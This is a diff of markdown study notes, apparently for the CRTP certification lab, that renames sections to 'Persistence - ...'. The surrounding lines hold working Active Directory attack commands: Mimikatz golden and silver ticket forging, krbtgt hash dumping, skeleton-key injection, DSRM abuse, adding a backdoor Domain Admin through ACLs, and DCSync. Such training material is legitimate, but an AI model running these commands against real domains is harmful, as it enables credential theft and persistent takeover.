@@ -1847,7 +1847,7 @@ copy executable file to another machine
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-# Golden Ticket
+# Persistence - Golden Ticket
 ### Methodology/Steps
 ```
 Get a Powershell session as a "domain admin" using "Over pass the hash" attack
@@ -1882,7 +1882,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain>
 # OR
 BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /aes256:<aes256> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
-# Silver Ticket
+# Persistence - Silver Ticket
 ### Execute mimikatz on DC as DA to get krbtgt hash
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
@@ -1915,7 +1915,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain>
 ```
 Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
 ```
-# Skeleton Key
+# Persistence - Skeleton Key
 ### Use the below command to inject a skeleton-Key
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
@@ -1934,7 +1934,7 @@ mimikatz # misc::skeleton
 mimikatz # !-
 ```
 
-# DSRM
+# Persistence - DSRM
 Every Domain Controller device contains a Local Administrator. we put the private password in this user when we create the Active Directory environment, so it is rarely used, change the password or access unless a disaster occurs in the Active Directory in order to reset the environment.
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cbfcdb2f-41d8-42b3-af04-dfbb80266380)
 
@@ -1972,8 +1972,8 @@ dir \\dcorp-dc\C$
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3a4ec50e-3551-4563-884b-f6c29ea6498e)
 
-# ACLs
-https://crtp-certification.certs-study.com/domain-persistence/acls/adminsdholder
+# Persistence - ACLs
+[Reference](https://crtp-certification.certs-study.com/domain-persistence/acls/adminsdholder)
 ###  Check the Domain Admins permission - PowerView as normal user
 ```
 Get-DomainObjectACL -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SideToName $_SecurityIdentitifer);$_} | ?{$_.IdentityName -match "student1"}
@@ -1987,7 +1987,7 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
 Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123 -AsPlainText -Force") -Verbose
 ```
 
-# DCSync
+# Persistence - DCSync
 you need to have Replication (DCSync) rights to perform the attack
 ### Add full-control rights
 ```
@@ -2001,3 +2001,7 @@ Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
+
+# Persistence - ACLs
+what you are trying to achieve here. we want to try to run a command on the admin controller without having admin privilege. [Reference](https://crtp-certification.certs-study.com/domain-persistence/acls/wmi)
+
